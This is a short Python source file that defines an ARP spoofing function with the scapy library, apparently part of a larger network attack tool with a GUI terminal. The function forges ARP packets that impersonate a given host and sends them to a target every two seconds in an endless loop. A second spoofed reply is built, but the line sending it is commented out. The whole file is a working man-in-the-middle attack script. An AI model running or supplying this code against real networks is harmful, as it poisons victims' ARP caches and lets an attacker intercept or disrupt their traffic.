from scapy.all import *
from time import sleep
from func.get_mac import get_mac

def arpspoof(target,hti,terminal=None):

    if terminal == None:
        print("[+] Sending spoofed ARP packets to "+target)    
    else:
        terminal['text'] += '\n[+] Sending spoofed ARP packets to '+target

    packet = Ether(dst=get_mac(target))/ARP(op='who-has',psrc=hti,pdst=target,hwdst=get_mac(target))
    packet2 = Ether()/ARP(op=2,psrc=target,pdst=hti,hwdst=get_mac(hti))

    while True:
        sendp(packet,verbose=0)
        #sendp(packet2,verbose=0)
        sleep(2)
